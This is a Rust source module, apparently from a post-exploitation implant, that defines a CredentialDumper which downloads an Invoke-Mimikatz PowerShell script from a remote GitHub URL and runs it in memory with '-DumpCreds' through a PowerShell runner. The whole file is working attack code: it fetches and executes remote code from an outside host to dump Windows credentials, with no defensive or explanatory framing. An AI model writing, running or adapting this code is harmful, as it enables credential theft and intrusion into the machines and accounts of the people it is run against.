/// Downloads Invoke-Mimikatz script and executes it in-memory via PowerShell.
pub struct CredentialDumper;

impl CredentialDumper {
    const DEFAULT_SCRIPT_URL: &str =
        "https://raw.githubusercontent.com/Avienma/Mimikatz/refs/heads/main/1.ps1";

    pub async fn dump() -> String {
        let client = match reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(60))
            .build()
        {
            Ok(c) => c,
            Err(e) => return format!("CredDump client error: {}", e),
        };

        let script = match client
            .get(Self::DEFAULT_SCRIPT_URL)
            .send()
            .await
        {
            Ok(resp) => match resp.text().await {
                Ok(t) => t,
                Err(e) => return format!("CredDump download failed: {}", e),
            },
            Err(e) => return format!("CredDump download failed: {}", e),
        };

        let full_script = format!("{}\r\nInvoke-Mimikatz -DumpCreds", script);
        super::power_shell::PowerShellRunner::execute(&full_script).await
    }
}
